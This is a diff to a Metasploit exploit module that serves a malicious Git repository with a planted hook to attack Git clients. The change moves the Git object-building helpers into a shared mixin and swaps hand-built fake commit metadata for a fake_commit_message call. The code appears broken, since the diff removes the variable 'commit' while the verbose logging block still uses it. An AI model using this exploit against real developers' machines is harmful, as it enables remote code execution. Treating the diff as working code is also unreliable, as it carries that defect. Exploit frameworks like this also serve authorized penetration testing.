+++ modules/exploits/multi/http/git_client_command_exec.rb
@@ -7,6 +7,7 @@ class MetasploitModule < Msf::Exploit::Remote
   Rank = ExcellentRanking
 
   include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::Git
   include Msf::Exploit::Powershell
 
   def initialize(info = {})
@@ -181,23 +182,12 @@ class MetasploitModule < Msf::Exploit::Remote
     git_dir = '.' + variants.sample
     sha1, content = build_object('tree', "40000 #{git_dir}\0#{[sha1].pack('H*')}")
     @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
-    # build the supposed commit that dropped this file, which has a random user/company
-    email = Rex::Text.rand_mail_address
-    first, last, company = email.scan(/([^\.]+)\.([^\.]+)@(.*)$/).flatten
-    full_name = "#{first.capitalize} #{last.capitalize}"
-    tstamp = Time.now.to_i
-    author_time = rand(tstamp)
-    commit_time = rand(author_time)
-    tz_off = rand(10)
-    commit = "author #{full_name} <#{email}> #{author_time} -0#{tz_off}00\n" \
-             "committer #{full_name} <#{email}> #{commit_time} -0#{tz_off}00\n" \
-             "\n" \
-             "Initial commit to open git repository for #{company}!\n"
+
     if datastore['VERBOSE']
       vprint_status("Malicious Git commit of #{git_dir}/#{datastore['GIT_HOOK']} is:")
       commit.each_line { |l| vprint_status(l.strip) }
     end
-    sha1, content = build_object('commit', "tree #{sha1}\n#{commit}")
+    sha1, content = build_object('commit', "tree #{sha1}\n#{fake_commit_message}")
     @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
     # build HEAD
     @repo_data[:git][:files]['/HEAD'] = "ref: refs/heads/master\n"
@@ -227,19 +217,6 @@ class MetasploitModule < Msf::Exploit::Remote
     @repo_data[:mercurial][:files]["?cmd=getbundle&common=#{'0' * 40}&heads=#{fake_sha1}"] = Zlib::Deflate.deflate("HG10UNfoofoofoo")
 
     # TODO: finish building the fake repository
-  end
-
-  # Build's a Git object
-  def build_object(type, content)
-    # taken from http://schacon.github.io/gitbook/7_how_git_stores_objects.html
-    header = "#{type} #{content.size}\0"
-    store = header + content
-    [Digest::SHA1.hexdigest(store), Zlib::Deflate.deflate(store)]
-  end
-
-  # Returns the Git object path name that a file with the provided SHA1 will reside in
-  def get_path(sha1)
-    sha1[0...2] + '/' + sha1[2..40]
   end
 
   def exploit
